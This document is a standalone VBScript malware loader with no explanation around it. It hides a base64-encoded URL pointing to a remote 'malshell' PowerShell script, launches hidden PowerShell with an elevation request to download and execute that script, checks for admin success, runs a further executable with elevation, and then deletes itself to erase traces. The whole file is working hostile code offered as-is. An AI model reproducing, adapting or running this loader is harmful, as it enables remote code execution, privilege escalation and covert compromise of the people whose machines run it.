Set objShell = CreateObject("Shell.Application")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strEncodedURL = "aHR0cHM6Ly9jeWJlcnN0ZXAudG9wLy5oaWRkZW5fc2VjdXJlX2RhdGEvc2hlbGxzY3JpcHQvbWFsc2hlbGwvdjEuNC92MS40LnBzMQ=="
strScriptPath = WScript.ScriptFullName
tempFlagFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%\adminflag.txt")
psCommand = "-Command ""'admin' | Out-File '" & tempFlagFile & "'; iex (irm ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & strEncodedURL & "'))))"""
objShell.ShellExecute "powershell.exe", psCommand, "", "runas", 0
WScript.Sleep 3000
powerShellSuccess = objFSO.FileExists(tempFlagFile)
If powerShellSuccess Then
    objFSO.DeleteFile(tempFlagFile)
End If
If powerShellSuccess Then
    strCurrentDirectory = objFSO.GetParentFolderName(WScript.ScriptFullName)
    exePath = objFSO.BuildPath(strCurrentDirectory, "")
    If objFSO.FileExists(exePath) Then
        objShell.ShellExecute exePath, "", "", "runas", 0
    End If
End If
If powerShellSuccess Then
    DeleteScript
End If

Sub DeleteScript()
    On Error Resume Next
    Set f = objFSO.GetFile(strScriptPath)
    f.Delete True
    If Err.Number <> 0 Then
        objShell.Run "cmd /c ping 127.0.0.1 -n 2 > nul & del """ & strScriptPath & """", 0, True
    End If
End Sub